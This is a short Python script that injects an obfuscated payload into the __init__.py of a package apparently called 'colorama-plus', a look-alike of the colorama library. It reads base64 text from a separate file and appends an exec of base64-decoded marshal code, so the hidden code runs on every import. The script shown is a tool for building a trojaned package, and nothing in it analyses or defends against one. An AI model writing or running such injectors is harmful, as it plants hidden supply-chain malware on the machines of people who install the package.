#!/usr/bin/env python3
import sys
sys.path.insert(0, r'C:\Users\kai\colorama-plus\colorama-plus\colorama')

with open(r'C:\Users\kai\colorama-plus\colorama-plus\colorama\_payload_b64.txt') as f:
    b64 = f.read().strip()

with open(r'C:\Users\kai\colorama-plus\colorama-plus\colorama\__init__.py', 'r') as f:
    content = f.read()

old_marker = 'import base64 as _b, marshal as _m'
if old_marker in content:
    # Trim everything from that line onwards
    idx = content.index(old_marker)
    content = content[:idx]
    content += f"""import base64 as _b, marshal as _m
exec(_m.loads(_b.b64decode('{b64}')))
"""
    with open(r'C:\Users\kai\colorama-plus\colorama-plus\colorama\__init__.py', 'w') as f:
        f.write(content)
    print('Done. New __init__.py:')
    with open(r'C:\Users\kai\colorama-plus\colorama-plus\colorama\__init__.py') as f:
        print(f.read())
else:
    print('Marker not found. Content:')
    print(content)
